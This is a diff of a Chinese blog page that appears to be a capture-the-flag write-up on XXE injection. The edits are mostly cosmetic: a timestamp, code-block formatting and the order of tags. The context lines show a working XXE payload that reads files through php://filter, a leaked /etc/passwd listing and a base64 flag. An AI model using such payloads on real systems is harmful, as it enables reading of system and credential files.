@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="ckf&#39;s blog">
 <meta property="og:description" content="简介：XXE漏洞攻击">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-03-29T13:00:33.036Z">
+<meta property="og:updated_time" content="2019-03-29T13:06:14.486Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE漏洞与伪协议">
 <meta name="twitter:description" content="简介：XXE漏洞攻击">
@@ -207,7 +207,7 @@
 <p> 与PCDATA相反，是不会被解析器解析的文本</p>
 </li>
 </ol>
-<p>注：XML允许用户自定义标签(当然也能自定义结构),比如<figure class="highlight plain"><figcaption><span>文档只使用在 HTML 标准中定义过的标签(当然结构也是预定义的)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## XML结构</span><br><span class="line">- 声明</span><br><span class="line">- DTD文档类型定义</span><br><span class="line">- 文档元素</span><br></pre></td></tr></table></figure></p>
+<p>注：XML允许用户自定义标签(当然也能自定义结构),比如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">此处与HTML不同，HTML 文档只使用在 HTML 标准中定义过的标签(当然结构也是预定义的)</span><br><span class="line"></span><br><span class="line">## XML结构</span><br><span class="line">- 声明</span><br><span class="line">- DTD文档类型定义</span><br><span class="line">- 文档元素</span><br></pre></td></tr></table></figure></p>
 <p>&lt;?xml version=”1.0” ?&gt;  #XML声明</p>
 <p>&lt;!DOCTYPE note[<br>    &lt;!ELEMENT note (to,from,heading,body)&gt;<br>    &lt;!ELEMENT to      (#PCDATA)&gt;<br>    &lt;!ELEMENT from    (#PCDATA)&gt;             #文档类型定义<br>    &lt;!ELEMENT heading (#PCDATA)&gt;<br>    &lt;!ELEMENT body    (#PCDATA)&gt;<br>]&gt;</p>
 <p><note></note></p>
@@ -273,7 +273,7 @@
 <p><author>&ckf;</author><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回显成功</span><br></pre></td></tr></table></figure></p>
 <p></p><h4>Thanks For you Feedback root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/bin/false<br>mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false<br>simple_user:x:1000:1000::/home/simple_user:/bin/bash<br>Debian-exim:x:102:102::/var/spool/exim4:/bin/false<br></h4><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据提示，猜测flag在```./flag```中，直接打开显示403 没有权限 </span><br><span class="line"></span><br><span class="line">构造XML外部实体</span><br></pre></td></tr></table></figure><p></p>
 <p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;<br>&lt;!DOCTYPE a [&lt;!ENTITY ckf SYSTEM ‘php://filter/convert.base64-encode/resource=flag’&gt; ]&gt;</p>
-<p><feedback><author>&ckf;</author><email><a href="mailto:1533360534@qq.com" target="_blank" rel="noopener">1533360534@qq.com</a></email><content>undefined</content></feedback><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回显如下，base64解码即可得到flag</span><br></pre></td></tr></table></figure></p>
+<p><feedback><author>&ckf;</author><email><a href="mailto:1533360534@qq.com" target="_blank" rel="noopener">1533360534@qq.com</a></email><content>undefined</content></feedback><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">回显如下，base64解码即可得到flag</span><br></pre></td></tr></table></figure></p>
 <p></p><h4>Thanks For you Feedback U2VjdXJpbmV0c3tYeGVfeFhFX0BMbF9UaDNfV0BZfQo=</h4><br><code>`</code><p></p>
 
       
@@ -515,11 +515,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color4">Pwn</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Pwn</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -527,11 +527,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">article</a>
+                <a href="javascript:void(0)" class="js-tag color3">吐槽</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">吐槽</a>
+                <a href="javascript:void(0)" class="js-tag color3">article</a>
               </li>
              
               <li class="article-tag-list-item">
